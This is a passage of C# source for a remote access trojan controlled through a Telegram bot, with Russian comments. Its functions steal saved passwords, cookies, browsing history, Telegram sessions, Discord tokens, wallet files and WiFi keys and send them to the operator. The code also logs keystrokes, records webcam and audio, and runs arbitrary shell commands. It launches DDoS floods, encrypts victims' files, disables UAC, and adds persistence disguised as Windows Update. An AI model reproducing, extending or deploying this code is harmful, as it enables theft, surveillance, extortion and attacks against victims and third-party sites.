                        await SendTextAsFile(callbackQuery.Message.Chat.Id, result, "steam_data.txt");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "stealpasswords")
                    {
                        string passwords = StealPasswords();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"🔑 Saved Passwords ({currentPcId}):\n{passwords}", true);
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "stealcookies")
                    {
                        string cookies = StealBrowserCookies();
                        await SendTextAsFile(callbackQuery.Message.Chat.Id, cookies, "cookies.txt");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "stealhistory")
                    {
                        string history = StealBrowserHistory();
                        await SendTextAsFile(callbackQuery.Message.Chat.Id, history, "history.txt");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }

                    else if (parameter == "bsod")
                    {
                        string result = TriggerBSOD();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"💀 BSOD ({currentPcId}):\n{result}");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "scare")
                    {
                        await ScareUser();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"👻 Scare screen activated ({currentPcId})");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "blockinput")
                    {
                        BlockInput(true);
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"🚫 Input blocked ({currentPcId})");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "unblockinput")
                    {
                        BlockInput(false);
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"✅ Input unblocked ({currentPcId})");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "persistence")
                    {
                        string result = AddAdvancedPersistence();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"🔒 Persistence: {result} ({currentPcId})");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    if (parameter == "listfiles")
                    {
                        currentCommand = "listfiles";
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter directory path to list files:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "downloadfile")
                    {
                        currentCommand = "downloadfile";
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter file path to download:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "shutdown")
                    {
                        string result = ShutdownPC();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"🔌 Shutdown: {result} ({currentPcId})");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "reboot")
                    {
                        string result = RebootPC();
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"🔄 Reboot: {result} ({currentPcId})");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == RECORD_AUDIO_COMMAND)
                    {
                        currentCommand = RECORD_AUDIO_COMMAND;
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "Enter seconds to record audio:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "keylog")
                    {
                        string result = HandleKeylogger("dump");
                        await SendTextAsFile(callbackQuery.Message.Chat.Id, result, "keylog.txt");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "messagebox")
                    {
                        currentCommand = "messagebox";
                        await SendSafeTextMessage(callbackQuery.Message.Chat.Id, "enter text:");
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "back")
                    {
                        await ShowMainMenu(callbackQuery.Message.Chat.Id);
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    break;

                case "menu":
                    if (parameter == "main")
                    {
                        await ShowMainMenu(callbackQuery.Message.Chat.Id);
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    else if (parameter == "pcs")
                    {
                        await ShowPcListMenu(callbackQuery.Message.Chat.Id);
                        await botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    }
                    break;
            }
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(callbackQuery.Message.Chat.Id, $"❌ Error: {ex.Message}");
        }
    }

    private static async Task ExecuteCommandWithInput(long chatId, string command, string input)
    {
        try
        {
            string result = "";

            if (command == "cmd")
            {
                result = ExecuteCommand("cmd.exe", $"/c {input}");
                await SendSafeTextMessage(chatId, $"📟 CMD ({currentPcId}):\n{result}", true);
            }
            else if (command == "ps")
            {
                result = ExecutePowerShell(input);
                await SendSafeTextMessage(chatId, $"⚡ PowerShell ({currentPcId}):\n{result}", true);
            }
            else if (command == "exe")
            {
                string[] exeArgs = input.Split(new[] { ' ' }, 2);
                string exePath = exeArgs[0];
                string parameters = exeArgs.Length > 1 ? exeArgs[1] : "";
                bool runAsAdmin = parameters.ToLower().Contains("admin");
                result = RunExe(exePath, parameters.Replace("admin", "").Trim(), runAsAdmin);
                await SendSafeTextMessage(chatId, $"🛠️ EXE ({currentPcId}):\n{result}", true);
            }
            else if (command == "webcam" && int.TryParse(input, out int seconds))
            {
                await HandleWebcamCommand(botClient, chatId, seconds);
            }
            else if (command == "record" && int.TryParse(input, out int recordSeconds))
            {
                await HandleScreenRecordCommand(botClient, chatId, recordSeconds);
            }
            else if (command == "download")
            {
                string downloadResult = DownloadFile(input);
                await SendSafeTextMessage(chatId, $"📥 Download ({currentPcId}):\n{downloadResult}");
            }
            else if (command == "startddos")
            {
                await StartDDoS(chatId, input);
            }
            else if (command == "encrypt")
            {
                await EncryptFiles(input, chatId);
            }
            else if (command == RECORD_AUDIO_COMMAND && int.TryParse(input, out int audioSeconds))
            {
                await HandleAudioRecordCommand(botClient, chatId, audioSeconds);
            }
            else if (command == "decrypt")
            {
                await DecryptFiles(input, chatId);
            }
            else if (command == "listfiles")
            {
                string fileList = ListAllFile(input);
                await SendTextAsFile(chatId, fileList, "file_list.txt");
            }
            else if (command == "downloadfile")
            {
                await DownloadAndSendFiles(chatId, input);
            }
            else if (command == "messagebox")
            {
                ShowMessageBox(input);
                await SendSafeTextMessage(chatId, $"💬 Message box shown: {input} ({currentPcId})");
            }
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Command error: {ex.Message}");
        }
    }

    private static async Task<string> StealTelegramSessions()
    {
        try
        {
            string tempDir = Path.Combine(Path.GetTempPath(), "TelegramSteal");
            if (Directory.Exists(tempDir))
            {
                Directory.Delete(tempDir, true);
            }
            Directory.CreateDirectory(tempDir);

            // Ищем tdata в стандартных местах
            string[] possiblePaths = new[]
            {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop", "tdata"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Telegram Desktop", "tdata"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData", "Roaming", "Telegram Desktop", "tdata"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData", "Local", "Telegram Desktop", "tdata"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram", "tdata"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Telegram", "tdata")
        };

            foreach (string path in possiblePaths)
            {
                if (Directory.Exists(path))
                {
                    try
                    {
                        string destPath = Path.Combine(tempDir, new DirectoryInfo(path).Parent.Name + "_tdata");
                        CopyDirectory(path, destPath, true);
                    }
                    catch { }
                }
            }

            // Ищем в браузерах (для Telegram Web)
            string[] browsers = { "Google\\Chrome", "Microsoft\\Edge", "Opera Software\\Opera Stable", "BraveSoftware\\Brave-Browser" };
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            foreach (string browser in browsers)
            {
                string browserPath = Path.Combine(appData, browser, "User Data", "Default", "Local Storage", "leveldb");
                if (Directory.Exists(browserPath))
                {
                    try
                    {
                        // Ищем файлы, связанные с Telegram Web
                        foreach (string file in Directory.GetFiles(browserPath, "*telegram*"))
                        {
                            string destPath = Path.Combine(tempDir, "BrowserSessions", browser.Split('\\').Last(), Path.GetFileName(file));
                            Directory.CreateDirectory(Path.GetDirectoryName(destPath));
                            System.IO.File.Copy(file, destPath);
                        }
                    }
                    catch { }
                }
            }

            // Архивируем все найденные данные
            string zipPath = Path.Combine(Path.GetTempPath(), "telegram_sessions.zip");
            if (System.IO.File.Exists(zipPath))
            {
                System.IO.File.Delete(zipPath);
            }

            System.IO.Compression.ZipFile.CreateFromDirectory(tempDir, zipPath);

            // Отправляем архив
            using (var stream = System.IO.File.OpenRead(zipPath))
            {
                await botClient.SendDocumentAsync(
                    chatId: adminChatId,
                    document: new InputOnlineFile(stream, "telegram_sessions.zip"),
                    caption: $"📱 Telegram sessions from {currentPcId}"
                );
            }

            // Очищаем временные файлы
            Directory.Delete(tempDir, true);
            System.IO.File.Delete(zipPath);

            return "✅ Telegram sessions stolen successfully";
        }
        catch (Exception ex)
        {
            return $"❌ Error stealing Telegram sessions: {ex.Message}";
        }
    }

    // Вспомогательный метод для копирования директорий
    private static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
    {
        var dir = new DirectoryInfo(sourceDir);
        if (!dir.Exists)
            throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");

        DirectoryInfo[] dirs = dir.GetDirectories();
        Directory.CreateDirectory(destinationDir);
        foreach (FileInfo file in dir.GetFiles())
        {
            string targetFilePath = Path.Combine(destinationDir, file.Name);
            file.CopyTo(targetFilePath);
        }

        if (recursive)
        {
            foreach (DirectoryInfo subDir in dirs)
            {
                string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                CopyDirectory(subDir.FullName, newDestinationDir, true);
            }
        }
    }

    private static async Task<string> StealCryptoWallets()
{
    try
    {
        var sb = new StringBuilder();
        sb.AppendLine("=== 🔑 Found Crypto Wallets ===");

        var cryptoPaths = new[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
        };

        var walletNames = new[]
        {
            "Electrum", "Exodus", "Atomic", "Zcash", "Monero", "Bitcoin",
            "Ethereum", "MetaMask", "Trust Wallet", "Coinomi", "Ledger Live"
        };

        foreach (var basePath in cryptoPaths)
        {
            foreach (var wallet in walletNames)
            {
                var walletPath = Path.Combine(basePath, wallet);
                if (!Directory.Exists(walletPath)) continue;

                sb.AppendLine($"\n=== {wallet} ===");
                
                foreach (var file in Directory.GetFiles(walletPath, "*.*", SearchOption.AllDirectories))
                {
                    var isCryptoFile = file.EndsWith(".dat") || 
                                      file.EndsWith(".wallet") ||
                                      file.EndsWith(".json") || 
                                      file.Contains("keys");

                    if (!isCryptoFile) continue;

                    try
                    {
                        var content = System.IO.File.ReadAllText(file); // Явное указание пространства имен
                        sb.AppendLine($"File: {file}\nSize: {new FileInfo(file).Length} bytes");
                    }
                    catch { /* ignore */ }
                }
            }
        }

        return sb.Length > 50 ? sb.ToString() : "No crypto wallets found";
    }
    catch (Exception ex)
    {
        return $"Error: {ex.Message}";
    }
}

    private static string GetWiFiPasswords()
    {
        try
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("=== 📶 WiFi Networks & Passwords ===");

            // Получаем список всех профилей WiFi
            string profiles = ExecuteCommand("netsh", "wlan show profiles");
            if (string.IsNullOrEmpty(profiles))
            {
                return "No WiFi profiles found";
            }

            // Обрабатываем каждую строку вывода
            foreach (string line in profiles.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
            {
                if (line.Contains("All User Profile") || line.Contains("Все профили пользователей"))
                {
                    // Извлекаем имя сети
                    string name = line.Split(':')[1].Trim();
                    sb.AppendLine($"\nSSID: {name}");

                    // Получаем детальную информацию о профиле
                    string profileInfo = ExecuteCommand("netsh", $"wlan show profile name=\"{name}\" key=clear");
                    if (string.IsNullOrEmpty(profileInfo))
                    {
                        sb.AppendLine("Password: [cannot retrieve]");
                        continue;
                    }

                    // Ищем строку с паролем (учтены разные языки системы)
                    string passwordLine = profileInfo.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
                        .FirstOrDefault(l => l.Contains("Key Content") ||
                                           l.Contains("Содержимое ключа") ||
                                           l.Contains("Пароль"));

                    // Извлекаем пароль
                    string password = "No password";
                    if (passwordLine != null)
                    {
                        try
                        {
                            password = passwordLine.Split(new[] { ':' }, 2)[1].Trim();
                        }
                        catch
                        {
                            password = "[found but cannot extract]";
                        }
                    }

                    sb.AppendLine($"Password: {password}");
                }
            }

            return sb.Length > 50 ? sb.ToString() : "No WiFi networks with passwords found";
        }
        catch (Exception ex)
        {
            return $"Error retrieving WiFi passwords: {ex.Message}";
        }
    }

    private static async Task<string> HandleScreamVideo(Document document)
    {
        try
        {
            // Проверяем расширение файла
            string ext = Path.GetExtension(document.FileName).ToLower();
            if (ext != ".mp4" && ext != ".avi" && ext != ".wmv")
            {
                return "❌ Поддерживаются только видеофайлы MP4, AVI или WMV";
            }

            // Скачиваем файл
            string tempFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ext);
            var file = await botClient.GetFileAsync(document.FileId);
            using (var fs = new FileStream(tempFile, FileMode.Create))
            {
                await botClient.DownloadFileAsync(file.FilePath, fs);
            }

            // Запускаем системный проигрыватель на полный экран
            PlayVideoFullscreenSilent(tempFile);

            return $"✅ video runned. file: {document.FileName}";
        }
        catch (Exception ex)
        {
            return $"❌ Error: {ex.Message}";
        }
    }

    private static async Task StartDDoS(long chatId, string targetUrl)
    {
        try
        {
            if (ddosCts != null && !ddosCts.IsCancellationRequested)
            {
                await SendSafeTextMessage(chatId, "⚠️ DDoS уже запущен. Сначала остановите текущую атаку.");
                return;
            }

            if (string.IsNullOrWhiteSpace(targetUrl) ||
                !Uri.TryCreate(targetUrl, UriKind.Absolute, out var uri) ||
                (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps))
            {
                await SendSafeTextMessage(chatId, "❌ Неверный URL. Укажите полный адрес (например, http://example.com)");
                return;
            }

            ddosCts = new CancellationTokenSource();
            currentDdosTarget = targetUrl;

            await SendSafeTextMessage(chatId, $"🔥 Запускаю DDoS на {targetUrl}...");

            // Запускаем атаку в фоновом потоке
            Task.Run(() => DDoSAttack(targetUrl, ddosCts.Token), ddosCts.Token);
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Ошибка запуска DDoS: {ex.Message}");
        }
    }

    private static async Task<string> GetGeolocation()
    {
        try
        {
            using (var client = new WebClient())
            {
                string ip = client.DownloadString("https://api.ipify.org");
                string locationInfo = client.DownloadString($"http://ip-api.com/json/{ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query");
                return locationInfo;
            }
        }
        catch (Exception ex)
        {
            return $"❌ Error getting location: {ex.Message}";
        }
    }

    private static async Task DDoSAttack(string targetUrl, CancellationToken ct)
    {
        try
        {
            using (var client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromSeconds(10);

                while (!ct.IsCancellationRequested)
                {
                    try
                    {
                        var response = await client.GetAsync(targetUrl, ct);
                        // Можно добавить другие типы запросов (POST и т.д.)
                    }
                    catch (OperationCanceledException)
                    {
                        break;
                    }
                    catch
                    {
                        // Игнорируем ошибки при атаке
                    }

                    await Task.Delay(10, ct); // Задержка между запросами
                }
            }
        }
        catch (Exception)
        {
            // Игнорируем ошибки
        }
    }

    private static async Task StopDDoS(long chatId)
    {
        try
        {
            if (ddosCts == null || ddosCts.IsCancellationRequested)
            {
                await SendSafeTextMessage(chatId, "ℹ️ Нет активных DDoS атак");
                return;
            }

            ddosCts.Cancel();
            ddosCts.Dispose();
            ddosCts = null;

            await SendSafeTextMessage(chatId, $"🛑 DDoS на {currentDdosTarget} остановлен");
            currentDdosTarget = null;
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Ошибка остановки DDoS: {ex.Message}");
        }
    }

    private static string SetVolume(int volume)
    {
        try
        {
            // Создаем enumerator (не требует Dispose в старых версиях)
            var enumerator = new MMDeviceEnumerator();

            // Получаем устройство (не требует Dispose в NAudio 1.x)
            var device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);

            // Устанавливаем громкость
            device.AudioEndpointVolume.MasterVolumeLevelScalar = volume / 100f;

            return "Success";
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    private static async Task<string> StealDiscordTokens()
    {
        try
        {
            StringBuilder result = new StringBuilder();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            // Проверяем все возможные пути к Discord
            string[] discordPaths = new[]
            {
            Path.Combine(localAppData, "Discord"),
            Path.Combine(localAppData, "DiscordCanary"),
            Path.Combine(localAppData, "DiscordPTB"),
            Path.Combine(localAppData, "DiscordDevelopment"),
            Path.Combine(appData, "Discord"),
            Path.Combine(appData, "DiscordCanary"),
            Path.Combine(appData, "DiscordPTB"),
            Path.Combine(appData, "DiscordDevelopment")
        };

            foreach (string discordPath in discordPaths)
            {
                if (Directory.Exists(discordPath))
                {
                    try
                    {
                        // Ищем Local Storage/leveldb файлы
                        string levelDbPath = Path.Combine(discordPath, "Local Storage", "leveldb");
                        if (Directory.Exists(levelDbPath))
                        {
                            result.AppendLine($"=== Found Discord at {discordPath} ===");

                            // Ищем токены в Local Storage
                            foreach (string file in Directory.GetFiles(levelDbPath, "*.ldb"))
                            {
                                try
                                {
                                    string content = System.IO.File.ReadAllText(file);
                                    ExtractDiscordTokens(content, result);
                                }
                                catch { }
                            }
                        }

                        // Проверяем файлы cookies
                        string cookiesPath = Path.Combine(discordPath, "Cookies");
                        if (System.IO.File.Exists(cookiesPath))
                        {
                            try
                            {
                                string tempFile = Path.GetTempFileName();
                                System.IO.File.Copy(cookiesPath, tempFile, true);

                                using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                                {
                                    conn.Open();
                                    using (var cmd = conn.CreateCommand())
                                    {
                                        cmd.CommandText = "SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%discord%'";
                                        using (var reader = cmd.ExecuteReader())
                                        {
                                            while (reader.Read())
                                            {
                                                string name = reader.GetString(0);
                                                byte[] encryptedValue = (byte[])reader[1];
                                                string value = Encoding.UTF8.GetString(ProtectedData.Unprotect(
                                                    encryptedValue, null, DataProtectionScope.CurrentUser));
                                                result.AppendLine($"[Cookie] {name}: {value}");
                                            }
                                        }
                                    }
                                }
                                System.IO.File.Delete(tempFile);
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
            }

            // Проверяем браузеры на наличие Discord Web
            string[] browsers = { "Google\\Chrome", "Microsoft\\Edge", "Opera Software\\Opera Stable", "BraveSoftware\\Brave-Browser" };
            string browserAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            foreach (string browser in browsers)
            {
                string browserPath = Path.Combine(browserAppData, browser, "User Data", "Default", "Local Storage", "leveldb");
                if (Directory.Exists(browserPath))
                {
                    try
                    {
                        result.AppendLine($"=== Checking {browser} for Discord tokens ===");

                        foreach (string file in Directory.GetFiles(browserPath, "*discord*"))
                        {
                            try
                            {
                                string content = System.IO.File.ReadAllText(file);
                                ExtractDiscordTokens(content, result);
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
            }

            if (result.Length == 0)
            {
                return "❌ No Discord tokens found";
            }

            return result.ToString();
        }
        catch (Exception ex)
        {
            return $"❌ Error stealing Discord tokens: {ex.Message}";
        }
    }

    private static void ExtractDiscordTokens(string content, StringBuilder result)
    {
        // Регулярные выражения для поиска токенов
        var tokenRegex = new Regex(@"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}|mfa\.[a-zA-Z0-9_-]{84}");
        var matches = tokenRegex.Matches(content);

        foreach (Match match in matches)
        {
            if (!result.ToString().Contains(match.Value))
            {
                result.AppendLine($"[Token] {match.Value}");
            }
        }
    }

    private static async Task ShowMainMenu(long chatId)
    {
        currentMenu = "main";

        var keyboard = new InlineKeyboardMarkup(new[]
        {
            new[]
            {
                InlineKeyboardButton.WithCallbackData("📋 PC List", "menu|pcs"),
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("🔄 Refresh", "menu|main"),
            }
        });

        await botClient.SendTextMessageAsync(
            chatId: chatId,
            text: "🏠 Main Menu",
            replyMarkup: keyboard
        );
    }

    private static string ListAllFile(string path)
    {
        try
        {
            StringBuilder sb = new StringBuilder();

            if (!Directory.Exists(path))
            {
                return $"Directory not found: {path}";
            }

            foreach (string file in Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
            {
                try
                {
                    var info = new FileInfo(file);
                    sb.AppendLine($"{info.FullName} | {info.Length / 1024} KB | {info.LastWriteTime}");
                }
                catch { }
            }

            return sb.ToString();
        }
        catch (Exception ex)
        {
            return $"Error listing files: {ex.Message}";
        }
    }

    private static async Task DownloadAndSendFile(long chatId, string filePath)
    {
        try
        {
            if (System.IO.File.Exists(filePath))
            {
                using (var stream = System.IO.File.OpenRead(filePath))
                {
                    await botClient.SendDocumentAsync(
                        chatId: chatId,
                        document: new InputOnlineFile(stream, Path.GetFileName(filePath)),
                        caption: $"📄 File: {filePath}"
                    );
                }
            }
            else
            {
                await SendSafeTextMessage(chatId, $"❌ File not found: {filePath}");
            }
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ File send error: {ex.Message}");
        }
    }

    private static async Task ShowPcListMenu(long chatId)
    {
        currentMenu = "pcs";

        var keyboardButtons = new List<InlineKeyboardButton[]>();

        foreach (var pc in connectedPcs)
        {
            keyboardButtons.Add(new[]
            {
                InlineKeyboardButton.WithCallbackData(
                    $"🖥️ {pc.Key} ({(DateTime.Now - pc.Value).TotalMinutes:F1} min ago)",
                    $"select_pc|{pc.Key}")
            });
        }

        keyboardButtons.Add(new[]
        {
            InlineKeyboardButton.WithCallbackData("🔙 Back", "menu|main"),
        });

        var keyboard = new InlineKeyboardMarkup(keyboardButtons);

        await botClient.SendTextMessageAsync(
            chatId: chatId,
            text: "📋 Available PCs:",
            replyMarkup: keyboard
        );
    }

    private static async Task ShowCommandMenu(long chatId)
    {
        currentMenu = "commands";

        var keyboard = new InlineKeyboardMarkup(new[]
        {
            new[]
            {
                InlineKeyboardButton.WithCallbackData("📸 Screenshot", "command|screen"),
                InlineKeyboardButton.WithCallbackData("🎥 Screen Record", "command|record"),
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("📟 CMD", "command|cmd"),
                InlineKeyboardButton.WithCallbackData("⚡ PowerShell", "command|ps"),
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("🛠️ Run EXE", "command|exe"),
                InlineKeyboardButton.WithCallbackData("📷 Webcam", "command|webcam"),
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("🔓 Disable UAC", "command|disableuac"),
                InlineKeyboardButton.WithCallbackData("🖥️ System Info", "command|sysinfo"),
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("🔑 Steal Passwords", "command|stealpasswords"),
                InlineKeyboardButton.WithCallbackData("🍪 Steal Cookies", "command|stealcookies"),
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("📜 Steal History", "command|stealhistory"),
                InlineKeyboardButton.WithCallbackData("⌨️ Keylogger", "command|keylog"),
            },
            new[]
{
    InlineKeyboardButton.WithCallbackData("📱 Steal Telegram", "command|stealtelegram"),
     InlineKeyboardButton.WithCallbackData("🎮 Steal Discord", "command|stealdiscord"),
},
            new[]
            {
                InlineKeyboardButton.WithCallbackData("💀 BSOD", "command|bsod"),
                InlineKeyboardButton.WithCallbackData("👻 Scare Screen", "command|scare"),
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("🚫 Block Input", "command|blockinput"),
                InlineKeyboardButton.WithCallbackData("✅ Unblock Input", "command|unblockinput"),
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("🔌 Shutdown", "command|shutdown"),
                InlineKeyboardButton.WithCallbackData("🔄 Reboot", "command|reboot"),
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("📥 Download URL", "command|download"),
                InlineKeyboardButton.WithCallbackData("📤 Upload File", "command|upload"),
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("🔒 Persistence", "command|persistence"),
                InlineKeyboardButton.WithCallbackData("💬 Message Box", "command|messagebox"),
            },
            new[]
        {
            InlineKeyboardButton.WithCallbackData("🔊 Sound Max", "command|soundmax"),
            InlineKeyboardButton.WithCallbackData("🔈 Sound Min", "command|soundmin"),
        },
            new[]
{
    InlineKeyboardButton.WithCallbackData("⬇️ Minimize All", "command|minimizeall"),
    InlineKeyboardButton.WithCallbackData("❌ Close Window", "command|closewindow"),
},
            new[]
{
    InlineKeyboardButton.WithCallbackData("🔥 Start DDoS", "command|startddos"),
    InlineKeyboardButton.WithCallbackData("🛑 Stop DDoS", "command|stopddos"),
},
            new[]
{
    InlineKeyboardButton.WithCallbackData("🔒 Encrypt Files", "command|encrypt"),
    InlineKeyboardButton.WithCallbackData("🔓 Decrypt Files", "command|decrypt"),
},
            new[]
        {
            InlineKeyboardButton.WithCallbackData("📍 Get Location", "command|getlocation"),
            InlineKeyboardButton.WithCallbackData("🖼️ Change Wallpaper", "command|changewallpaper"),
        },
            new[]
        {
            InlineKeyboardButton.WithCallbackData("📂 List Files", "command|listfiles"),
            InlineKeyboardButton.WithCallbackData("📥 Download File", "command|downloadfile"),
        },
            new[]
{
    InlineKeyboardButton.WithCallbackData("🎬 Scream Make", "command|screammake"),
    InlineKeyboardButton.WithCallbackData("🖤 Broken Pixels", "command|brokenpixels"),
},
            new[]
        {
            InlineKeyboardButton.WithCallbackData("💰 Steal Crypto", "command|stealcrypto"),
            InlineKeyboardButton.WithCallbackData("📶 Steal WiFi", "command|stealwifi")
        },
            new[]
{
    InlineKeyboardButton.WithCallbackData("🎮 Steal Steam", "command|stealsteam"),
    InlineKeyboardButton.WithCallbackData("🎤 Record Audio", $"command|{RECORD_AUDIO_COMMAND}"),
},
            new[]
            {
                InlineKeyboardButton.WithCallbackData("🔙 Back", "menu|pcs"),
            }
        });

        await botClient.SendTextMessageAsync(
            chatId: chatId,
            text: $"🖥️ Commands for PC: {selectedPcId}",
            replyMarkup: keyboard
        );
    }

    private static Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
    {
        Console.WriteLine($"Telegram Bot Error: {exception.Message}");
        return Task.CompletedTask;
    }

    private static void AddToStartup()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;

            var regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            regKey.SetValue("WindowsUpdate", exePath);
            regKey.Close();

            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            System.IO.File.Copy(exePath, Path.Combine(startupPath, "WindowsUpdate.exe"), true);

            string schTasksCommand = $"/create /tn \"Windows Update Service\" /tr \"{exePath}\" /sc onlogon /rl highest /f";
            ExecuteCommand("schtasks", schTasksCommand);
        }
        catch { }
    }

    private static void MakePersistent()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;

            string tempPath = Path.Combine(Path.GetTempPath(), "svchost.exe");
            System.IO.File.Copy(exePath, tempPath, true);

            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WindowsUpdate.exe");
            System.IO.File.Copy(exePath, appDataPath, true);

            string programDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft\\WindowsUpdate.exe");
            System.IO.File.Copy(exePath, programDataPath, true);
        }
        catch { }
    }

    private static string AddAdvancedPersistence()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;

            var regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            regKey.SetValue("WindowsUpdate", exePath);
            regKey.Close();

            string serviceCommand = $"create WindowsUpdate binPath= \"{exePath}\" start= auto";
            ExecuteCommand("sc", serviceCommand);

            string wmiCommand = $"/namespace:\\\\root\\subscription path __EventFilter create Name=\"WindowsUpdateFilter\", EventNamespace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"";
            ExecuteCommand("wmic", wmiCommand);

            return "✅ Persistence added via registry, service and WMI";
        }
        catch (Exception ex)
        {
            return $"❌ Error: {ex.Message}";
        }
    }

    private static string DisableUAC()
    {
        try
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);

            key.SetValue("EnableLUA", 0, Microsoft.Win32.RegistryValueKind.DWord);
            key.SetValue("ConsentPromptBehaviorAdmin", 0, Microsoft.Win32.RegistryValueKind.DWord);
            key.Close();

            return "✅ UAC disabled. Reboot to apply changes.";
        }
        catch (Exception ex)
        {
            return $"❌ Error: {ex.Message}";
        }
    }

    private static string ExecuteCommand(string filename, string arguments)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
